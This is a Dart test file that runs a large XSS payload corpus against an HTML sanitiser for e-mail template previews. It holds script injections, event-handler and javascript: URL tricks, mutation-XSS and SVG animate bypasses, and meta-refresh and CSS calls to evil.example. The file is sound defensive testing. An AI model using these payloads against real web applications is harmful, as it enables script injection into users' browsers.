import 'package:elly_mobile_app/services/safe_html.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:html/parser.dart' as html_parser;

/// Attack corpus for [safePreviewDocument]. The template HTML is untrusted: whatever comes out must have no
/// executable / network-reaching content left. Complements `safe_html_test.dart` (the happy hostile document).
///
/// The oracle ([neutralised]) checks the output twice: (1) DOM layer, the output parsed again: no forbidden
/// element, no `on*`, no leftover URL attribute but `a/area href="#"` and `data:image/` src, no script-ish
/// scheme in any attribute, only our CSP as http-equiv; (2) raw layer, the serialised string a browser will parse
/// itself (comments stripped): no `<script`, no `on…=` token, no `javascript:`/`vbscript:`/`data:text/html`.
/// Layer 2 is what catches mutation XSS (parser differential), which the html package's own re-parse cannot see.
///
/// Bypasses found by this corpus and fixed since are in the `formerly KNOWN BYPASS` group (reason + severity).

const _forbiddenTags = {
  'script', 'noscript', 'iframe', 'frame', 'frameset', 'object', 'embed', 'applet', 'portal', 'link', 'base', //
};
const _urlAttributes = {
  'src', 'srcset', 'href', 'xlink:href', 'background', 'poster', 'action', 'formaction', 'data', 'ping', //
  'longdesc', 'cite', 'manifest', 'codebase', 'archive', 'lowsrc', 'dynsrc', 'srcdoc',
};

String _squash(String value) => value.replaceAll(RegExp(r'[\x00-\x20]'), '').toLowerCase();

bool _badScheme(String value) {
  final v = _squash(value);
  return v.startsWith('javascript:') ||
      v.startsWith('vbscript:') ||
      v.startsWith('livescript:') ||
      (v.startsWith('data:') && !v.startsWith('data:image/'));
}

final _handlerToken = RegExp(r'[\s"\x27/]on[a-z]+\s*=', caseSensitive: false);

/// Sanitises [html] and fails (with the [name] in the reason) unless the output is neutralised. Returns the output.
String neutralised(String html, {String? name, bool strictRaw = true}) {
  final reason = name ?? html;
  final out = safePreviewDocument(html);
  final doc = html_parser.parse(out);

  // --- layer 1: DOM -------------------------------------------------------------------------------------------
  for (final e in doc.querySelectorAll('*')) {
    expect(_forbiddenTags, isNot(contains(e.localName)), reason: '<${e.localName}> survived: $reason');
    final pairs = [for (final k in e.attributes.keys) ('$k'.toLowerCase(), e.attributes[k]!)];
    for (final (attr, value) in pairs) {
      expect(attr, isNot(startsWith('on')), reason: 'event handler $attr on <${e.localName}>: $reason');
      if (attr != 'style') {
        expect(_badScheme(value), isFalse, reason: '$attr="$value" on <${e.localName}>: $reason');
      }
      if (_urlAttributes.contains(attr)) {
        final anchorHref = attr == 'href' && const {'a', 'area'}.contains(e.localName) && value == '#';
        final dataImage = attr == 'src' && value.trim().toLowerCase().startsWith('data:image/');
        expect(anchorHref || dataImage, isTrue, reason: '$attr="$value" on <${e.localName}> kept: $reason');
      }
      if (attr == 'attributename') {
        // SVG <animate>/<set> can write any attribute at runtime (href=javascript:, onmouseover=…).
        final target = value.trim().toLowerCase();
        expect(
          target.startsWith('on') || target.endsWith('href') || target == 'src',
          isFalse,
          reason: '<${e.localName} attributeName=$value>: $reason',
        );
      }
    }
  }
  final policies = doc.querySelectorAll('meta[http-equiv]');
  expect(policies, hasLength(1), reason: 'extra http-equiv meta: $reason');
  expect(policies.single.attributes['content'], previewCsp, reason: reason);
  expect(doc.head!.children.first, same(policies.single), reason: 'CSP must be the first head child: $reason');

  // --- layer 2: raw string a browser will parse ---------------------------------------------------------------
  if (strictRaw) {
    final raw = out.replaceAll(RegExp(r'<!--[\s\S]*?-->'), '');
    expect(raw.toLowerCase(), isNot(contains('<script')), reason: 'raw <script: $reason');
    expect(_handlerToken.hasMatch(raw), isFalse, reason: 'raw on*= token: $reason\n$out');
    final lower = raw.toLowerCase();
    for (final needle in ['javascript:', 'vbscript:', 'data:text/html']) {
      expect(lower, isNot(contains(needle)), reason: 'raw $needle: $reason\n$out');
    }
  }
  return out;
}

void main() {
  group('forbidden elements, whatever the spelling', () {
    for (final tag in _forbiddenTags) {
      test('<$tag>: lower / upper / mixed case, attributes, self-closed, unterminated', () {
        final mixed = tag.split('').indexed.map((p) => p.$1.isEven ? p.$2.toUpperCase() : p.$2).join();
        for (final html in [
          '<$tag src="https://evil.example/a" href="x">payload</$tag><p>Merhaba</p>',
          '<${tag.toUpperCase()} SRC=x>payload</${tag.toUpperCase()}>',
          '<$mixed>payload</$mixed>',
          '<$tag/>',
          '<$tag\n>payload',
          '<$tag/xss src=x>',
          '<p>önce</p><$tag><p>sonra</p>',
          '<head><$tag>payload</$tag></head><body>x</body>',
          '<svg><$tag>payload</$tag></svg>',
          '<div><span><$tag src=x></span></div>',
        ]) {
          neutralised(html);
        }
      });
    }

    test('surrounding visible content survives the removal', () {
      final out = neutralised('<p>Merhaba</p><script>alert(1)</script><p>Dünya</p><iframe src=x></iframe>');
      expect(html_parser.parse(out).body!.text, 'MerhabaDünya');
    });

    test('script payload split across tags / comments does not re-assemble', () {
      for (final html in [
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<<script>script>alert(1)<</script>/script>',
        '<scr\x00ipt>alert(1)</scr\x00ipt>',
        '<scr<!-- -->ipt>alert(1)</script>',
        '<script <script>alert(1)</script>',
        '<script>/*</script><script>*/alert(1)</script>',
        '<style>/*</style><script>*/alert(1)</script>',
      ]) {
        neutralised(html, strictRaw: !html.contains('<scr<') && !html.contains('<<'));
      }
    });

    test('namespaced look-alikes are inert unknown elements, not scripts', () {
      final doc = html_parser.parse(
        safePreviewDocument('<svg:script>alert(1)</svg:script><x:iframe src=x></x:iframe>'),
      );
      expect(doc.querySelectorAll('script, iframe'), isEmpty);
    });
  });

  group('meta http-equiv / charset', () {
    const metas = [
      '<meta http-equiv="refresh" content="0;url=https://evil.example">',
      '<META HTTP-EQUIV=REFRESH CONTENT="0; URL=javascript:alert(1)">',
      '<meta http-equiv="  refresh " content="0">',
      '<meta content="0;url=//evil.example" http-equiv=refresh>',
      '<meta http-equiv="set-cookie" content="a=b">',
      '<meta http-equiv="Content-Security-Policy" content="default-src *">',
      '<META HTTP-EQUIV="content-security-policy" CONTENT="script-src * \x27unsafe-inline\x27">',
      '<meta http-equiv="Content-Security-Policy" content="${'default-src \x27none\x27'}">',
      '<meta http-equiv="Content-Security-Policy" content="$previewCsp">',
      '<meta http-equiv="x-ua-compatible" content="IE=7">',
      '<meta http-equiv>',
    ];
    for (final meta in metas) {
      test(meta, () {
        neutralised('<html><head>$meta</head><body>x</body></html>');
        neutralised('<html><body>$meta x</body></html>');
        neutralised('$meta<p>x</p>');
        neutralised('<noscript>$meta</noscript><p>x</p>');
        neutralised('<head>$meta</head><head>$meta</head><body>x');
        neutralised('<html><head><title>t</title></head><body><div>$meta</div></body></html>');
      });
    }

    test('a harmless <meta name> stays (only http-equiv is removed)', () {
      final doc = html_parser.parse(safePreviewDocument('<head><meta name="description" content="Hoş geldin"></head>'));
      expect(doc.querySelector('meta[name=description]')!.attributes['content'], 'Hoş geldin');
    });
  });

  group('CSP injection point', () {
    final shapes = {
      'empty string': '',
      'whitespace only': ' \n\t ',
      'doctype only': '<!DOCTYPE html>',
      'plain text': 'sadece metin',
      'bare fragment': '<p>x</p>',
      'no head, html + body': '<html><body><p>x</p></body></html>',
      'no head, body attributes': '<body onload=x style="margin:0">y',
      'head after body': '<body><p>x</p></body><head><title>t</title></head>',
      'head inside body': '<body><head><meta name=a content=b></head>x</body>',
      'two heads': '<head><title>a</title></head><head><title>b</title></head><body>c',
      'three <html> roots': '<html><head></head><html><head></head><html><body>x',
      'comment before everything': '<!-- c --><!DOCTYPE html><html><head></head><body>x',
      'self-closed head': '<html><head/><body>x</body></html>',
      'frameset document': '<frameset><frame src="javascript:alert(1)"></frameset>',
      'xml prolog + processing instruction':
          '<?xml version="1.0"?><?xml-stylesheet href="https://evil.example/x.xsl"?><p>x',
      'BOM + leading junk': '﻿\u0000<p>x',
    };
    shapes.forEach((name, html) {
      test('$name: our CSP then viewport are the first two head children', () {
        neutralised(html, name: name);
        final head = html_parser.parse(safePreviewDocument(html)).head!.children;
        expect(head[0].attributes['http-equiv'], 'Content-Security-Policy', reason: name);
        expect(head[1].attributes['name'], 'viewport', reason: name);
      });
    });

    test('an existing <meta> CSP cannot override or weaken ours (it is removed, exactly one remains)', () {
      final out = safePreviewDocument(
        '<head><meta http-equiv="Content-Security-Policy" content="default-src *; script-src *"></head><body>x',
      );
      expect(RegExp('http-equiv', caseSensitive: false).allMatches(out), hasLength(1));
      expect(out, isNot(contains('script-src')));
      expect(out, contains(previewCsp));
    });

    test('the policy itself: nothing remote, no script, no eval, no forms, no base', () {
      expect(previewCsp, startsWith("default-src 'none'"));
      expect(previewCsp, isNot(contains('*')));
      expect(previewCsp, isNot(contains('http')));
      expect(previewCsp, isNot(contains('unsafe-eval')));
      expect(previewCsp, isNot(contains('script-src')));
      expect(previewCsp, contains("form-action 'none'"));
      expect(previewCsp, contains("base-uri 'none'"));
      expect(previewCsp, contains('img-src data:'));
      expect(previewCsp, contains('font-src data:'));
      expect(RegExp(r"style-src '?unsafe-inline'?$|style-src 'unsafe-inline';").hasMatch(previewCsp), isTrue);
      expect(previewCsp, isNot(contains('connect-src')), reason: 'falls back to default-src none');
    });
  });

  group('event handlers', () {
    const handlers = [
      'onload', 'onerror', 'onclick', 'onmouseover', 'onfocus', 'onblur', 'onanimationstart', 'ontoggle', //
      'onpageshow', 'onstart', 'onbegin', 'onloadstart', 'onauxclick', 'onpointerenter', 'onwheel', 'oncopy',
      'onbeforeinput', 'onhashchange', 'onresize', 'onsubmit', 'oninput', 'onunload', 'onx', 'on',
    ];
    for (final h in handlers) {
      test('$h: spellings and quoting', () {
        final upper = h.toUpperCase();
        final mixed = h.split('').indexed.map((p) => p.$1.isEven ? p.$2.toUpperCase() : p.$2).join();
        for (final html in [
          '<img src=x $h=alert(1)>',
          '<img src=x $upper=alert(1)>',
          '<img src=x $mixed="alert(1)">',
          "<img src=x $h='alert(1)'>",
          '<img src=x $h = "alert(1)">',
          '<img src=x $h\n=\n"alert(1)">',
          '<img src=x\t$h\t=\talert(1)>',
          '<img src=x/$h=alert(1)>',
          '<img/$h=alert(1) src=x>',
          '<img src=x $h>',
          '<img src=x $h="">',
          '<img src=x $h=`alert(1)`>',
          '<img src=x $h=&#97;lert(1)>',
          '<img src=x $h="&#x61;&#108;ert&#40;1&#41;">',
          '<img src="x" $h="a"$h="b">',
          '<img src=x $h=1 $upper=2 $mixed=3>',
        ]) {
          neutralised(html);
        }
      });
    }

    test('handler name written with an entity in the value / extra junk around it', () {
      for (final html in [
        '<img src=x onerror&#61;alert(1)>',
        '<img src=x onerror&equals;alert(1)>',
        '<img src=x onerror="alert(1)"onload="alert(2)">',
        '<img src=x/onerror=alert(1)//>',
      ]) {
        neutralised(html);
      }
    });

    test('junk glued to the name makes a different (inert) attribute name, never a handler', () {
      // The parser keeps `"onerror`, `'onerror`, `<script`, … as attribute / tag NAMES; a browser reads them the same.
      // The raw-string layer is off (it would flag the look-alike substrings); the DOM layer still checks every name.
      for (final html in [
        '<img src=x "onerror=alert(1)>',
        "<img src=x 'onerror=alert(1)>",
        '<img src=x =onerror=alert(1)>',
        '<img src=x ;onerror=alert(1)>',
        '<a href="x"<script>alert(1)</script>>y</a>',
        '<div<script>alert(1)</script>>',
      ]) {
        final out = neutralised(html, strictRaw: false);
        final doc = html_parser.parse(out);
        expect(doc.querySelectorAll('script, img[onerror]'), isEmpty, reason: html);
        for (final e in doc.querySelectorAll('*')) {
          expect(e.attributes.keys.map((k) => '$k'), isNot(contains('onerror')), reason: html);
        }
      }
    });

    test('on every kind of element, including the document roots', () {
      for (final html in [
        '<html onmouseover=alert(1)><body onload=alert(2)>x',
        '<body onpageshow=alert(1) onresize=alert(2)>x</body>',
        '<a href="#" onclick="alert(1)">x</a>',
        '<input autofocus onfocus=alert(1)>',
        '<select autofocus onfocus=alert(1)></select><textarea autofocus onfocus=alert(1)></textarea>',
        '<video><source onerror=alert(1)></video><audio src=x onerror=alert(1)></audio>',
        '<details open ontoggle=alert(1)>x</details>',
        '<marquee onstart=alert(1)>x</marquee>',
        '<div style="animation-name:x" onanimationstart=alert(1)>x</div>',
        '<svg onload=alert(1)><circle onmouseover=alert(2) /></svg>',
        '<math onclick=alert(1)><mi onmouseover=alert(2)>x</mi></math>',
        '<table onclick=alert(1)><tr onclick=alert(2)><td onclick=alert(3)>x</td></tr></table>',
        '<form onsubmit=alert(1)><button onclick=alert(2)>x</button></form>',
        '<object onerror=alert(1)></object><button onfocus=alert(1) autofocus>x</button>',
        '<iframe onload=alert(1)></iframe><p onclick=alert(1)>x</p>',
        '<custom-element onclick=alert(1) onfocus=alert(2)>x</custom-element>',
      ]) {
        neutralised(html);
      }
    });

    test('non-handler attributes starting with "on" are dropped too (over-removal is the safe side)', () {
      expect(safePreviewDocument('<div one="1" onion="2" title="t">x</div>'), isNot(contains('onion')));
    });

    test('legitimate attributes of the same element survive', () {
      final img = html_parser
          .parse(
            safePreviewDocument(
              '<img alt="Logo" width="120" onerror="x()" style="display:block" src="data:image/gif;base64,R0lG">',
            ),
          )
          .querySelector('img')!;
      expect(img.attributes, {
        'alt': 'Logo',
        'width': '120',
        'style': 'display:block',
        'src': 'data:image/gif;base64,R0lG',
      });
    });
  });

  group('URL attributes × dangerous schemes', () {
    const schemes = [
      'javascript:alert(1)',
      'JaVaScRiPt:alert(1)',
      '  javascript:alert(1)',
      '\tjava\tscript:alert(1)',
      'java\nscript:alert(1)',
      'java\rscript:alert(1)',
      '\x01javascript:alert(1)',
      ' javascript:alert(1)',
      '&#106;avascript:alert(1)',
      '&#x6A;avascript:alert(1)',
      'javascript&colon;alert(1)',
      'javascript&#58;alert(1)',
      '&#0000106avascript:alert(1)',
      'vbscript:msgbox(1)',
      'VBScript:msgbox(1)',
      'livescript:alert(1)',
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
      'DATA:TEXT/HTML,<script>alert(1)</script>',
      ' data:text/html,<script>alert(1)</script>',
      'data:application/xhtml+xml,<script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>',
      'data:application/javascript,alert(1)',
      'data:,alert(1)',
      'https://evil.example/x',
      '//evil.example/x',
    ];
    const targets = {
      'a': ['href', 'ping'],
      'area': ['href', 'ping'],
      'img': ['src', 'srcset', 'lowsrc', 'dynsrc', 'longdesc'],
      'form': ['action'],
      'button': ['formaction'],
      'input': ['formaction', 'src'],
      'video': ['src', 'poster'],
      'audio': ['src'],
      'source': ['src', 'srcset'],
      'track': ['src'],
      'table': ['background'],
      'td': ['background'],
      'body': ['background'],
      'blockquote': ['cite'],
      'html': ['manifest'],
      'svg': ['xlink:href', 'href'],
      'use': ['xlink:href', 'href'],
      'image': ['xlink:href', 'href'],
      'div': ['href', 'src', 'action', 'data', 'background'],
    };
    targets.forEach((tag, attrs) {
      for (final attr in attrs) {
        test('<$tag $attr=…>', () {
          for (final scheme in schemes) {
            final quoted = scheme.contains('"') ? "'$scheme'" : '"$scheme"';
            // svg-family elements need the svg context to be parsed as foreign content.
            final markup = const {'use', 'image'}.contains(tag)
                ? '<svg><$tag $attr=$quoted /></svg>'
                : '<$tag $attr=$quoted>x</$tag>';
            neutralised(markup, name: '<$tag $attr=${scheme.replaceAll('\n', r'\n')}>');
          }
        });
      }
    });

    test('srcset candidate lists', () {
      for (final html in [
        '<img srcset="javascript:alert(1) 1x, https://evil.example/2x.png 2x">',
        '<img srcset="data:text/html,x 1x">',
        '<picture><source srcset="https://evil.example/a.webp" type="image/webp"><img src="data:image/gif;base64,R0lG"></picture>',
      ]) {
        final out = neutralised(html);
        expect(out, isNot(contains('srcset')));
        expect(out, isNot(contains('evil.example')));
      }
    });

    test('only data:image/ may stay in src (any case, leading spaces); it is the only network-free source', () {
      for (final ok in [
        'data:image/png;base64,iVBORw0KGgo=',
        'DATA:IMAGE/GIF;base64,R0lG',
        '  data:image/jpeg;base64,/9j/',
      ]) {
        final img = html_parser.parse(safePreviewDocument('<img src="$ok">')).querySelector('img')!;
        expect(img.attributes['src'], ok);
      }
      for (final no in [
        'data:text/html,x',
        'data:application/octet-stream,x',
        'data:imagex/png,x',
        'image/png',
        '/a.png',
        'cid:logo@x',
      ]) {
        final img = html_parser.parse(safePreviewDocument('<img src="$no">')).querySelector('img')!;
        expect(img.attributes.containsKey('src'), isFalse, reason: no);
      }
    });

    test('links: every a/area href becomes "#", the text and style stay', () {
      final doc = html_parser.parse(
        safePreviewDocument(
          '<a href="https://example.com" style="color:red" target="_blank" rel="noopener">Site</a>'
          '<a HREF=" JAVASCRIPT:alert(1)">JS</a><a href="mailto:a@b.co">Mail</a><a href="tel:123">Tel</a>'
          '<a>kotvasız</a><area href="javascript:alert(1)" shape=rect coords="0,0,1,1">',
        ),
      );
      final links = doc.querySelectorAll('a[href], area');
      expect(links.map((a) => a.attributes['href']), ['#', '#', '#', '#', '#']);
      expect(doc.querySelectorAll('a').map((a) => a.text), ['Site', 'JS', 'Mail', 'Tel', 'kotvasız']);
      expect(doc.querySelector('a')!.attributes['style'], 'color:red');
    });

    test('a non-anchor element never keeps an href', () {
      for (final tag in ['div', 'p', 'span', 'button', 'link', 'base', 'svg', 'math', 'img', 'form']) {
        final out = neutralised('<$tag href="https://evil.example/x" src="https://evil.example/y">x</$tag>');
        expect(out, isNot(contains('evil.example')), reason: tag);
      }
    });
  });

  group('SVG / MathML', () {
    test('script, handlers, foreignObject and friends', () {
      for (final html in [
        '<svg><script>alert(1)</script></svg>',
        '<svg><script href="data:,alert(1)"/></svg>',
        '<svg><script xlink:href="https://evil.example/x.js"/></svg>',
        '<svg onload=alert(1)></svg>',
        '<svg/onload=alert(1)>',
        '<svg><g onload=alert(1)><rect onmouseover=alert(2) /></g></svg>',
        '<svg><foreignObject><iframe src=//evil.example></iframe></foreignObject></svg>',
        '<svg><foreignObject><script>alert(1)</script><body onload=alert(2)></foreignObject></svg>',
        '<svg><foreignObject><form action=javascript:alert(1)><button>x</button></form></foreignObject></svg>',
        '<svg><foreignObject><object data="javascript:alert(1)"></object><embed src=x></foreignObject></svg>',
        '<svg><a xlink:href="javascript:alert(1)"><text y=20>x</text></a></svg>',
        '<svg><a href="javascript:alert(1)"><text y=20>x</text></a></svg>',
        '<svg><use xlink:href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg onload=alert(1)/>#x"/></svg>',
        '<svg><use href="https://evil.example/s.svg#x"/></svg>',
        '<svg><image href="https://evil.example/i.png" onerror=alert(1) /></svg>',
        '<svg><feImage href="javascript:alert(1)"/></svg>',
        '<svg><style>@import url(//evil.example/a.css);</style></svg>',
        '<svg><style><script>alert(1)</script></style></svg>',
        '<svg><![CDATA[<script>alert(1)</script>]]></svg>',
        '<svg><title><script>alert(1)</script></title></svg>',
        '<svg><desc><iframe src=x></iframe></desc></svg>',
        '<math><mi xlink:href="javascript:alert(1)" onmouseover=alert(2)>x</mi></math>',
        '<math href="javascript:alert(1)"><mtext>x</mtext></math>',
        '<math><annotation-xml encoding="text/html"><script>alert(1)</script></annotation-xml></math>',
        '<math><annotation-xml encoding="text/html"><iframe src=x></iframe></annotation-xml></math>',
        '<math><maction actiontype="statusline#" xlink:href="javascript:alert(1)">x</maction></math>',
        '<svg><svg><svg onload=alert(1)><script>1</script></svg></svg></svg>',
      ]) {
        neutralised(html);
      }
    });
  });

  group('forms', () {
    test('a form cannot submit anywhere: no action / formaction, <form> kept as inert markup', () {
      for (final html in [
        '<form action="https://evil.example/post" method=post><input name=a value=b><input type=submit></form>',
        '<form action=javascript:alert(1)><button>Gönder</button></form>',
        '<form><button formaction="https://evil.example/b" formmethod=post>x</button></form>',
        '<form><input type=submit formaction=javascript:alert(1)></form>',
        '<form id=f></form><button form=f formaction="//evil.example">x</button>',
        '<form><input type=image src="https://evil.example/s.png" formaction="//evil.example"></form>',
        '<form action=x><input type=submit onclick=alert(1)></form>',
        '<form target=_blank action=x><button>x</button></form>',
        '<isindex action="javascript:alert(1)">',
      ]) {
        final out = neutralised(html);
        final doc = html_parser.parse(out);
        for (final e in doc.querySelectorAll('form, button, input')) {
          expect(e.attributes.containsKey('action'), isFalse, reason: html);
          expect(e.attributes.containsKey('formaction'), isFalse, reason: html);
        }
      }
      expect(previewCsp, contains("form-action 'none'"), reason: 'second layer for the leftover <form>');
    });

    test('a form post / link click could only navigate: blocked after the first load', () {
      for (final url in ['about:blank', 'https://evil.example/post', 'javascript:alert(1)', 'data:text/html,x', '']) {
        expect(isPreviewNavigationAllowed(url, loaded: true), isFalse, reason: url);
      }
    });
  });

  group('CSS', () {
    test('a <style> block cannot break out into markup', () {
      for (final html in [
        '<style>p{color:red}</style><script>alert(1)</script>',
        '<style></style><script>alert(1)</script><style>',
        '<style>/*</style><img src=x onerror=alert(1)>*/</style>',
        '<style><!--</style><script>alert(1)</script>-->',
        '<head><style>@import "x"</style><script>alert(1)</script></head>',
        '<body><style>p{}</style><iframe src=x></iframe></body>',
      ]) {
        neutralised(html, strictRaw: false); // @import text legitimately stays in the stylesheet text
      }
    });

    test('network CSS (@import, url(), expression, behavior, binding) is neutralised; the CSP stays as 2nd layer', () {
      const css = '''
<style>@import url("https://evil.example/a.css"); @import "//evil.example/b.css";
p { width: expression(alert(1)); behavior: url(x.htc); -moz-binding: url(x.xml#a); background: url(https://evil.example/p.png) }
</style><div style="background-image:url('https://evil.example/d.png')">x</div>''';
      final out = neutralised(css, strictRaw: false);
      final lower = out.toLowerCase();
      for (final gone in ['@import', 'evil.example', 'expression(', 'behavior:', '-moz-binding:', 'x.htc']) {
        expect(lower, isNot(contains(gone)), reason: gone);
      }
      // The CSP remains the second barrier (also asserted in "the policy itself").
      expect(previewCsp, contains("default-src 'none'"));
      expect(previewCsp, contains('img-src data:'));
      expect(previewCsp, contains("style-src 'unsafe-inline'"));
      expect(html_parser.parse(out).head!.children.first.attributes['content'], previewCsp);
    });

    test('inline styling the template relies on is preserved', () {
      final div = html_parser
          .parse(safePreviewDocument('<div style="color:#6366f1;padding:8px 16px">x</div>'))
          .querySelector('div')!;
      expect(div.attributes['style'], 'color:#6366f1;padding:8px 16px');
    });
  });

  group('comments, CDATA, processing instructions', () {
    test('payloads hidden in comment-like constructs', () {
      for (final html in [
        '<!--><script>alert(1)</script>-->',
        '<!---><script>alert(1)</script>-->',
        '<!-- --!><script>alert(1)</script>-->',
        '<!--- ><script>alert(1)</script> -->',
        '<!-- a --><script>alert(1)</script><!-- b -->',
        '<!--[if IE]><script>alert(1)</script><![endif]-->',
        '<!--[if !IE]><!--><script>alert(1)</script><!--<![endif]-->',
        '<!--[if gte IE 4]><img src=x onerror=alert(1)><![endif]-->',
        '<![CDATA[<script>alert(1)</script>]]>',
        '<![CDATA[ ]]><script>alert(1)</script>',
        '<p><![CDATA[x]]><img src=x onerror=alert(1)></p>',
        '<?php echo 1 ?><script>alert(1)</script>',
        '<?xml version="1.0"?><script>alert(1)</script>',
        '<!x><script>alert(1)</script>',
        '<!DOCTYPE html [<!ENTITY x "<script>alert(1)</script>">]><p>&x;</p>',
        '<!-- <img src=x onerror=alert(1)> -->',
      ]) {
        final out = neutralised(html);
        final doc = html_parser.parse(out);
        expect(doc.querySelectorAll('script, img[onerror]'), isEmpty, reason: html);
      }
    });

    test('script text inside a comment stays text (no element is created from it)', () {
      final doc = html_parser.parse(safePreviewDocument('<!-- <script>alert(1)</script> --><p>x</p>'));
      expect(doc.querySelectorAll('script'), isEmpty);
      expect(doc.body!.text, 'x');
    });
  });

  group('broken / hostile nesting', () {
    test('mis-nested and unterminated markup', () {
      for (final html in [
        '<script>alert(1)',
        '<script>alert(1)</scr',
        '<img src="x onerror=alert(1)',
        "<img src='x' onerror='alert(1)",
        '<img src=x onerror=alert(1)',
        '<div class="a"onclick="alert(1)">x</div>',
        '<b><p>x</b></p><script>alert(1)</script>',
        '<a><table><a onclick=alert(1)>x</table></a>',
        '<table><img src=x onerror=alert(1)><tr><td>x</td></tr></table>',
        '<table><script>alert(1)</script></table>',
        '<table><tr><td><script>alert(1)</script></td></tr></table>',
        '<select><script>alert(1)</script><option>x</option></select>',
        '<select><iframe src=x></iframe><img src=x onerror=alert(1)></select>',
        '<form><form onsubmit=alert(1)><input></form></form>',
        '<p><form><p onclick=alert(1)>x</p></form>',
        '</p></div></body></html><script>alert(1)</script>',
        '</script><script>alert(1)</script>',
        '</style></title></textarea></xmp></noscript><script>alert(1)</script>',
        '<title><script>alert(1)</script></title><p onclick=alert(1)>x</p>',
        '<textarea><script>alert(1)</script></textarea><img src=x onerror=alert(1)>',
        '<textarea></textarea><img src=x onerror=alert(1)></textarea>',
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        '<noscript><style></noscript><img src=x onerror=alert(1)></style></noscript>',
        '<noembed><img src=x onerror=alert(1)></noembed>',
        '<noframes><img src=x onerror=alert(1)></noframes>',
        '<template><img src=x onerror=alert(1)><script>alert(2)</script></template>',
        '<template><template><img src=x onerror=alert(1)></template></template>',
        '<button><button onclick=alert(1)>x</button></button>',
        '<h1><h2><h3 onclick=alert(1)>x',
        '<dd><dt onclick=alert(1)>x',
        '<li><li onclick=alert(1)>x',
        '<ruby><rt onclick=alert(1)>x',
        '<object><param name=x value=javascript:alert(1)><embed src=x></object>',
        '<applet code="x"><param name=y value=z></applet>',
        '<xmp><script>alert(1)</script></xmp>',
        '<listing><img src=x onerror=alert(1)></listing>',
        '<image src=x onerror=alert(1)>',
        '<plaintext><script>alert(1)</script>',
      ]) {
        // xmp / plaintext / noembed / noframes hold their content as raw text in a browser too (no live elements).
        neutralised(html, strictRaw: !RegExp(r'^<(xmp|plaintext|noembed|noframes)').hasMatch(html));
      }
    });

    test('raw-text elements keep their payload as text, never as live elements', () {
      for (final html in ['<xmp><img src=x onerror=alert(1)></xmp>', '<plaintext><img src=x onerror=alert(1)>']) {
        final doc = html_parser.parse(safePreviewDocument(html));
        expect(doc.querySelectorAll('img'), isEmpty, reason: html);
      }
    });

    test('many attributes / long values do not slow it down or leak a handler', () {
      final html = '<img src=x ${'onerror=a x=1 ' * 3000}>';
      final sw = Stopwatch()..start();
      neutralised(html);
      expect(sw.elapsedMilliseconds, lessThan(5000));
    });

    test('moderately deep nesting stays fast and keeps the content', () {
      final html = '${'<div>' * 1500}Merhaba<script>alert(1)</script>${'</div>' * 1500}';
      final sw = Stopwatch()..start();
      final out = neutralised(html);
      expect(html_parser.parse(out).body!.text, 'Merhaba');
      expect(sw.elapsedMilliseconds, lessThan(5000));
    });

    test('the same input always gives the same output', () {
      const html = '<head><title>t</title></head><body onload=x><a href="javascript:x">y</a><script>1</script>';
      expect(safePreviewDocument(html), safePreviewDocument(html));
    });

    test('feeding the output back in leaves nothing new to remove (only the duplicate viewport differs)', () {
      const html =
          '<a href="javascript:x" onclick=y>l</a><script>1</script><img src="data:image/png;base64,AA==" onerror=z>';
      String strip(String s) => s.replaceAll(RegExp(r'<meta name="viewport"[^>]*>'), '');
      final once = safePreviewDocument(html);
      expect(strip(safePreviewDocument(once)), strip(once));
    });
  });

  group('benign content is not damaged', () {
    test('a typical e-mail template renders as before', () {
      const mail = '''<!DOCTYPE html><html lang="tr"><head><meta charset="UTF-8"><title>Hoş geldin</title>
<style>.btn{display:inline-block;padding:12px 24px;background:#6366f1;color:#fff}</style></head>
<body style="margin:0;font-family:Arial"><table width="600" align="center" cellpadding="0"><tr><td>
<h1>Merhaba Ahmet</h1><p>Hesabınız <b>hazır</b>.</p><img src="data:image/png;base64,iVBORw0KGgo=" alt="Logo" width="120">
<a class="btn" href="https://example.com/giris">Giriş yap</a><hr><p style="color:#888">İyi günler</p></td></tr></table></body></html>''';
      final out = neutralised(mail);
      final doc = html_parser.parse(out);
      expect(doc.querySelector('h1')!.text, 'Merhaba Ahmet');
      expect(doc.querySelector('table')!.attributes['width'], '600');
      expect(doc.querySelector('a.btn')!.attributes['href'], '#');
      expect(doc.querySelector('img')!.attributes['alt'], 'Logo');
      expect(doc.querySelector('style')!.text, contains('background:#6366f1'));
      expect(doc.querySelector('title')!.text, 'Hoş geldin');
      expect(doc.querySelector('html')!.attributes['lang'], 'tr');
    });

    test('text that merely mentions dangerous strings is kept as inert text', () {
      final doc = html_parser.parse(
        safePreviewDocument('<p>&lt;script&gt;alert(1)&lt;/script&gt; ve javascript:alert(1) onclick=x</p>'),
      );
      expect(doc.body!.text, '<script>alert(1)</script> ve javascript:alert(1) onclick=x');
      expect(doc.querySelectorAll('script'), isEmpty);
    });
  });

  group('preview navigation rule', () {
    test('only the very first about:blank load', () {
      expect(isPreviewNavigationAllowed('about:blank', loaded: false), isTrue);
      for (final url in [
        'ABOUT:BLANK',
        ' about:blank',
        'about:blank ',
        'about:blank?x=1',
        'about:blank#frag',
        'about:srcdoc',
        'about:',
        '',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'file:///etc/passwd',
        'http://localhost:8080/api/v1/emails',
        '#',
      ]) {
        expect(isPreviewNavigationAllowed(url, loaded: false), isFalse, reason: 'first load: "$url"');
        expect(isPreviewNavigationAllowed(url, loaded: true), isFalse, reason: 'after load: "$url"');
      }
    });
  });

  group('formerly KNOWN BYPASS (fixed in safe_html.dart; kept as regressions)', () {
    // Fixed (was: YÜKSEK/ORTA: <svg> animasyon öğeleri (<animate>/<set>/<animateTransform>) temizlenmiyor;
    // attributeName=href + values=javascript: ya da attributeName=onmouseover çalışma anında yasak özniteliği
    // yazar (statik on*/URL temizliğini atlar). JS kapalı + gezinme engeli + CSP sayesinde bugün sömürülemez, ama
    // sanitizasyon tek başına yetmiyor.)
    test('SVG <animate> writes href=javascript:', () {
      neutralised(
        '<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>click</text></a></svg>',
      );
    });
    test('SVG <set> writes an on* handler', () {
      neutralised('<svg><set attributeName=onmouseover to=alert(1) /><rect width=100 height=100 /></svg>');
    });
